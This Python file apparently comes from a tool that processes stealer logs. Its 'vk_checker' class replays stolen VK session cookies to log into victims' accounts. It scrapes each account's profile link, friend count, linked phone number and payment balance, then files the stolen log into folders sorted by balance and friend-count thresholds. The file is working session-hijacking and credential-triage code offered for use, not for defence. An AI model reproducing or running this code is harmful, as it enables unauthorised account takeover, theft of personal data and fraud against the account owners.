# -*- coding: utf-8 -*-
import shutil

import StandartMethod
import re
import random
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
class vk_checker():
    @staticmethod
    def create_file(create_path: str,cook: str,path: str, id: str, friend: str, phone: str, balanc: str, file: str):
        id = StandartMethod.StandartMetod.validate(id)
        dir_path = create_path + f"\\{id} - Frineds({friend}) - Balans({balanc})"
        try:
            os.mkdir(dir_path)
        except OSError as error:
            pass
        data = {
            'Path': path,
            'Cookie': cook,
            'Account Info': {
                'Nick': id ,
                'Link': f'https://vk.com{id}',
                'Friends': friend ,
                'Phone': phone,
                'Balanc': balanc
            }
        }
        with open(f'{dir_path}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
            json.dump(data, outfile, indent=4, ensure_ascii=False)
        shutil.copy(f'{file}\\{path}', f'{dir_path}\\{path}')

        settings = StandartMethod.headless.get_settings()['Filter_settings']['Vk']

        try:
            os.mkdir(f'{create_path}\\{settings["Full_log"]}')
        except:
            pass
        try:
            os.mkdir(f'{create_path}\\{settings["Balanc_path"]}')
        except:
            pass

        path_premium_log = f'{create_path}\\{settings["Balanc_path"]}\\{id} - Frineds({friend}) - Balans({balanc})'
        if int(settings['Filter_balanc']) <= int(balanc):
            try:
                os.mkdir(path_premium_log)
            except:
                pass
            with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{path}')

        try:
            os.mkdir(f'{create_path}\\{settings["Friends_path"]}')
        except:
            pass

        path_premium_log = f'{create_path}\\{settings["Friends_path"]}\\{id} - Frineds({friend}) - Balans({balanc})'
        if int(settings['Filter_friends']) <= int(friend):
            try:
                os.mkdir(path_premium_log)
            except:
                pass
            with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{path}')
    @staticmethod
    def checker(dict, account, path_log, file):
        headers = StandartMethod.StandartMetod.get_headers()
        cook = {
            "remixnsid": account['remixnsid'],
            "remixsid": account['remixsid'], }
        resoult_cookie = f'remixnsid={cook["remixnsid"]}; remixsid={cook["remixsid"]};'
        try:
            req = requests.get('https://vk.com/feed', cookies=cook, headers=headers)
            soup = BeautifulSoup(req.text, 'lxml')
            id = soup.find('div', class_='ip_user_link').find('a').get('href')
            req = requests.get(f'https://vk.com{id}', cookies=cook, headers=headers)
            soup = BeautifulSoup(req.text, 'lxml')
            friends = soup.find('div', class_='OwnerInfo__rowCenter').text
            req = requests.get('https://vk.com/settings', cookies=cook, headers=headers)
            soup = BeautifulSoup(req.text, 'lxml')
            phone = soup.find('a', class_='Row Row_go').find('div', class_='Row__labeledContent').text
            req = requests.get('https://vk.com/settings?act=payments', cookies=cook, headers=headers)
            soup = BeautifulSoup(req.text, 'lxml')
            balanc = soup.find('div', class_='Pad Pad_theme_gray Balance__header').find('div', class_='Pad__corner').text.split(' ')[0]

            vk_checker.create_file(f'{dict}', resoult_cookie,path_log, id, friends, phone, balanc, file)
        except:
            pass